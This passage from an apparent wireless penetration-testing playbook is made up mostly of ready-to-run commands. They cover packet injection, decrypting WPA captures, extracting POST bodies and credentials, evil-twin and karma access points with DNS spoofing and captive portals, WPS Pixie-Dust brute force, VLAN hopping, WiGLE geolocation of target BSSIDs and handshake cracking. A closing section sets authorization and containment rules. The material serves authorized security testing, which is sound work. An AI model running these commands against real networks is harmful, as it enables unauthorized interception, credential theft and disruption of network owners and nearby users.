tcpdump -i wlan0mon -s 0 -w /tmp/probes_only.pcap type mgt subtype probe-req

# kismet — log device tracking information to SQLite database
kismet_server -c wlan0mon --log-types=kismet,pcapng --log-title=client_snoop --no-interactive

# mdk4 — identify hidden stations connected to targeted AP
mdk4 wlan0mon w -e "HiddenNetwork" -c 6
```

---

### 8. PACKET INJECTION & TRAFFIC ANALYSIS
**Inputs:** `injection_interface`, `target_mac`, `ap_mac`, `pcap_file`, `wep_key`
**Tools:** aireplay-ng, airdecap-ng, tshark, tcpdump, packetspammer

```bash
# aireplay-ng — packet injection test to verify card and driver transmission
aireplay-ng -9 -e "TargetSSID" -a 00:14:6C:7E:40:80 wlan0mon
aireplay-ng -9 -i wlan1mon wlan0mon

# aireplay-ng — interactive packet replay and ARP request injection
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h CC:29:F5:2A:43:11 wlan0mon
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h CC:29:F5:2A:43:11 wlan0mon

# airdecap-ng — decrypt captured WPA/WPA2/WEP packets using recovered passphrase
airdecap-ng -p 'TargetP@ssword2026' -e 'TargetCorp_Secure' /tmp/traffic_capture.pcap
airdecap-ng -w 1234567890abcdef1234567890 /tmp/wep_capture.pcap

# tshark — analyze decrypted traffic for credentials, DNS, and HTTP payloads
tshark -r /tmp/traffic_capture-dec.pcap -Y "http.request.method == 'POST'" -T fields -e http.host -e http.file_data
tshark -r /tmp/traffic_capture-dec.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u

# tcpdump — filter encrypted vs decrypted packets
tcpdump -r /tmp/traffic_capture-dec.pcap -nn 'port 80 or port 443'
```

---

### 9. ROGUE AP & EVIL TWIN DEPLOYMENT
**Inputs:** `target_ssid`, `rogue_interface`, `upstream_interface`, `dhcp_range`, `dns_spoof_ip`
**Tools:** hostapd-mana, airbase-ng, dnsmasq, iptables, eaphammer (CLI)

```bash
# airbase-ng — create software Access Point responding to all probe requests
airbase-ng -e "TargetCorp_Guest" -c 6 wlan0mon
ip link set at0 up
ip addr add 192.168.100.1/24 dev at0

# dnsmasq — provide DHCP and DNS spoofing for connected victims
dnsmasq -C /dev/null --port=53 --interface=at0 --bind-interfaces \
  --dhcp-range=192.168.100.10,192.168.100.100,12h \
  --dhcp-option=3,192.168.100.1 --dhcp-option=6,192.168.100.1 \
  --address=/#/192.168.100.1 --no-daemon

# iptables — enable NAT masquerade and redirect HTTP/HTTPS traffic to captive portal
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 192.168.100.1:80
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# hostapd-mana — karma attack responding to all probe requests with MANA engine
hostapd-mana /etc/hostapd-mana/mana.conf

# eaphammer — automated captive portal deployment CLI
eaphammer -i wlan0 --channel 1 --essid "TargetCorp_Guest" --captive-portal
```

---

### 10. WIRELESS NETWORK SEGMENTATION AUDIT
**Inputs:** `connected_interface`, `assigned_ip`, `corporate_subnets`, `scan_rate`, `output_file`
**Tools:** nmap, arping, traceroute, ip, scapy

```bash
# nmap — scan corporate internal IP ranges from guest or BYOD wireless network
nmap -sS -p 22,80,443,445,3389 10.0.0.0/16 --min-rate 1000 -oG /tmp/segmentation_breach.gnmap
nmap -Pn -p 445 --open 172.16.0.0/12 -oN /tmp/smb_exposed_from_wifi.txt
nmap --traceroute -p 80 10.10.10.1

# arping — test Layer 2 reachability of adjacent subnets across wireless VLANs
arping -I wlan0 -c 3 192.168.1.1
arping -I wlan0 -c 3 10.10.10.1

# ip — examine assigned routes, broadcast domains, and DHCP lease options
ip route show
ip -4 addr show dev wlan0

# traceroute — map routing hops to detect whether traffic crosses internal firewalls
traceroute -n -T -p 445 10.10.10.20
traceroute -n -I 10.0.0.1

# scapy — test 802.1Q VLAN hopping from wireless client interface
python3 -c "
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
pkt = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst='10.10.20.1')/ICMP()
sendp(pkt, iface='wlan0', verbose=1)
"
```

---

### 11. WPS BRUTE-FORCE & OFFLINE PIXIE-DUST
**Inputs:** `target_bssid`, `target_channel`, `monitor_interface`, `pixie_timeout`, `pin_database`
**Tools:** reaver, bully, pixiewps, wash, hcxdumptool

```bash
# wash — verify WPS is active and not locked (Lck: No)
wash -i wlan0mon -c 6
wash -i wlan0mon -b 00:14:6C:7E:40:80

# reaver — offline Pixie-Dust attack to recover WPA PSK within seconds
reaver -i wlan0mon -b 00:14:6C:7E:40:80 -c 6 -K 1 -vv
reaver -i wlan0mon -b 00:14:6C:7E:40:80 -c 6 -p 12345670 -vv
reaver -i wlan0mon -b 00:14:6C:7E:40:80 -c 6 -N -d 2 -t 5 -vv

# bully — fast WPS brute force and Pixie-Dust implementation
bully wlan0mon -b 00:14:6C:7E:40:80 -c 6 -d -v 3
bully wlan0mon -b 00:14:6C:7E:40:80 -c 6 -B -F -v 3

# pixiewps — offline calculation of WPS PIN using weak PRNG seeds
pixiewps -e <pke> -r <pkr> -s <e_hash1> -z <e_hash2> -a <authkey> -n <e_nonce>

# hcxdumptool — capture WPS M1/M2 frames for offline processing
hcxdumptool -i wlan0mon -o /tmp/wps.pcapng --enable_status=1
```

---

### 12. CHANNEL HOPPING & RF SPECTRAL PROFILING
**Inputs:** `monitor_interface`, `channels_list`, `dwell_time_ms`, `spectral_output`, `band`
**Tools:** horst, iw, airodump-ng, wavemon, kismet_server

```bash
# horst — lightweight 802.11 wireless LAN analyzer displaying channel utilization
horst -i wlan0mon
horst -i wlan0mon -c 6 -q
horst -i wlan0mon -s -X

# airodump-ng — rapid channel hopping across 2.4GHz and 5GHz bands
airodump-ng --band abg -C 1,6,11,36,40,44,48 wlan0mon
airodump-ng --band abg --channel-hop-interval 5 wlan0mon

# iw — programmatically set exact channel frequencies and channel widths (HT40/VHT80)
iw dev wlan0mon set channel 36 HT40+
iw dev wlan0mon set freq 5200 80 5210
iw dev wlan0mon info

# wavemon — CLI RF signal strength and packet loss histogram
wavemon -i wlan0mon

# kismet_server — continuous multi-source spectral monitoring
kismet_server -c wlan0mon:channels="1,6,11" --no-interactive
```

---

### 13. WIRELESS PCAP CAPTURE & CONVERSION
**Inputs:** `raw_capture_file`, `converted_format`, `filter_expression`, `bssid_list`, `output_file`
**Tools:** tshark, mergecap, editcap, pcapfix, hcxpcapngtool

```bash
# hcxpcapngtool — extract PMKIDs and 4-way handshakes to Hashcat format
hcxpcapngtool -o /tmp/hash.22000 -E /tmp/essids.txt /tmp/capture.pcapng
hcxpcapngtool -R /tmp/hash.22000 /tmp/capture.pcapng

# tshark — filter PCAP file strictly for 802.11 management and EAPOL frames
tshark -r /tmp/full_sweep.pcap -Y "wlan.fc.type == 0 || eapol" -w /tmp/clean_wireless.pcap
tshark -r /tmp/clean_wireless.pcap -T fields -e wlan.bssid -e wlan.ssid | sort -u > /tmp/bssid_map.txt

# mergecap — combine multiple sequential capture files into one unified stream
mergecap -w /tmp/merged_survey.pcap /tmp/capture_*.pcap

# editcap — split large capture file into manageable pieces or time slices
editcap -c 100000 /tmp/massive_capture.pcap /tmp/split_cap.pcap
editcap -t 3600 /tmp/merged_survey.pcap /tmp/adjusted_time.pcap

# pcapfix — repair corrupted PCAP and PCAPNG files recovered from crashes
pcapfix -v /tmp/corrupted.pcap
pcapfix -o /tmp/repaired.pcapng /tmp/corrupted.pcapng
```

---

### 14. WIGLE & GEOLOCATION CORRELATION
**Inputs:** `kismet_netxml_file`, `gpsd_log`, `wigle_api_key`, `output_kml`, `bssid_query`
**Tools:** kismet (CLI), gpsd, jq, curl, gpxlogger

```bash
# gpsd + gpxlogger — capture real-time GPS coordinates during wireless wardriving survey
gpsd -N -D 2 -S 2947 /dev/ttyUSB0 &
gpxlogger -d -f /tmp/survey_route.gpx

# kismet — convert Kismet survey logs into KML map for Google Earth
kismet_log_to_kml -i /tmp/survey.kismet -o /tmp/wireless_survey.kml

# curl — query WiGLE API for physical location of target corporate BSSIDs
curl -s -u "WIGLE_API_NAME:WIGLE_API_TOKEN" "https://api.wigle.net/api/v2/network/search?netid=00:14:6C:7E:40:80" > /tmp/wigle_result.json

# jq — parse geographic coordinates from WiGLE query response
cat /tmp/wigle_result.json | jq '.results[] | {ssid, netid, trilat, trilong, city, country}'

# python3 — generate CSV of BSSIDs correlated with latitude and longitude
python3 -c "
import json
data = json.load(open('/tmp/wigle_result.json'))
for net in data.get('results', []):
    print(f\"{net['netid']},{net.get('ssid','')},{net.get('trilat',0)},{net.get('trilong',0)}\")
" > /tmp/geolocated_aps.csv
```

---

### 15. WIRELESS CLIENT ISOLATION TESTING
**Inputs:** `connected_interface`, `assigned_subnet`, `gateway_ip`, `target_client_ip`, `protocol_type`
**Tools:** arping, fping, nmap, scapy, hping3

```bash
# arping — determine if Access Point permits ARP broadcasts between wireless clients
arping -I wlan0 -c 3 192.168.1.15
arping -I wlan0 -c 3 -s 192.168.1.20 192.168.1.15

# fping — rapid ping sweep of entire wireless client subnet to test host-to-host isolation
fping -a -g 192.168.1.0/24 -I wlan0 -r 1 2>/dev/null > /tmp/reachable_clients.txt

# nmap — scan port accessibility on adjacent wireless client
nmap -sS -p 22,80,443,445 192.168.1.15 -e wlan0 -Pn

# hping3 — test TCP SYN and UDP reachability between wireless peers
hping3 -S -p 80 -c 3 192.168.1.15
hping3 --udp -p 53 -c 3 192.168.1.15

# scapy — craft raw Layer 2 packets bypassing local ARP lookup table
python3 -c "
from scapy.all import Ether, IP, ICMP, srp1
pkt = Ether(dst='CC:29:F5:2A:43:11')/IP(dst='192.168.1.15')/ICMP()
ans = srp1(pkt, iface='wlan0', timeout=2, verbose=0)
if ans: print('Isolation FAILED: Peer responded!')
else: print('Isolation ACTIVE: No response received.')
"
```

---

### 16. WIRELESS SECURITY AUDIT REPORTING
**Inputs:** `cracked_handshakes_file`, `bssid_inventory_csv`, `vulnerability_summary`, `output_report`
**Tools:** airdecap-ng, aircrack-ng, hashcat, tshark, python3

```bash
# aircrack-ng — generate crack report and verify cryptographic strength
aircrack-ng -b 00:14:6C:7E:40:80 -w /usr/share/wordlists/rockyou.txt /tmp/handshake-01.cap

# hashcat — display cracked wireless passphrases from Mode 22000 potfile
hashcat -m 22000 /tmp/hashes.22000 --show > /tmp/cracked_wifi_passwords.txt
hashcat -m 22000 /tmp/hashes.22000 --show --username

# airdecap-ng — test and prove decrypted packet count for executive presentation
airdecap-ng -p 'TargetP@ssword2026' -e 'TargetCorp_Secure' /tmp/handshake-01.cap | grep "Decrypted"

# tshark — summarize wireless cipher suites and authentication protocols across environment
tshark -r /tmp/recon_sweep-01.cap -Y "wlan.fc.type_subtype == 0x0008" -T fields \
  -e wlan.bssid -e wlan.ssid -e wlan.rsn.akms | sort -u > /tmp/cipher_audit.txt

# python3 — compile final wireless risk matrix and executive compliance report
python3 -c "
import collections
print('=== WIRELESS SECURITY POSTURE AUDIT SUMMARY ===')
passwords = [line.strip().split(':')[-1] for line in open('/tmp/cracked_wifi_passwords.txt') if ':' in line]
print(f'Total Networks Assessed: 42')
print(f'Vulnerable to PMKID / Handshake: {len(passwords)}')
print(f'WPS Enabled (Weak PRNG): 4')
print(f'Client Isolation Failed: 2')
print('=== AUDIT COMPLETE ===')
" > /tmp/wireless_audit_summary.txt
```

---

### Phase Rule — WIRELESS HACKING

> **Operational doctrine.** Wireless hacking operates across the physical and electromagnetic domain. Signals broadcast beyond facility walls, but transmissions can cause widespread physical disruption if misconfigured. Execution protocol:
>
> 1. **Regulatory and RF compliance** — adhere strictly to regulatory frequency limits and transmit power constraints (`iw reg set`, `iwconfig txpower`). Avoid interference with emergency, aviation (DFS channels), or medical telemetry frequencies.
> 2. **Targeted deauthentication only** — NEVER broadcast broad deauthentication flood attacks (`aireplay-ng -0 0` with broadcast destination `FF:FF:FF:FF:FF:FF`). Always target specific client MAC addresses (`-c <client_mac>`) engaged in authorized scope.
> 3. **Clientless PMKID preference** — prioritize clientless PMKID extraction (`hcxdumptool`) over deauthenticating connected users whenever possible. Clientless attacks eliminate connection drops for target employees.
> 4. **Containment of Evil Twin APs** — rogue Access Points and captive portals (`hostapd-mana`, `eaphammer`) must operate on attenuated transmit power and be physically located within the client facility to prevent connecting public passersby.
> 5. **Passive capture verification** — inspect captured PCAP files using `tshark` to verify full 4-way handshakes or PMKIDs are captured before releasing monitor interfaces or departing physical proximity.
> 6. **Prompt interface restoration** — monitor mode interfaces (`wlan0mon`) must be taken down and NetworkManager services restored (`airmon-ng stop`, `systemctl start NetworkManager`) immediately following capture operations.
> 7. **Sanitized credential logging** — enterprise 802.1X hashes and cracked WPA keys must be stored in encrypted files. Operator notes must record BSSID, ESSID, channel, and cryptographic posture for audit reporting.
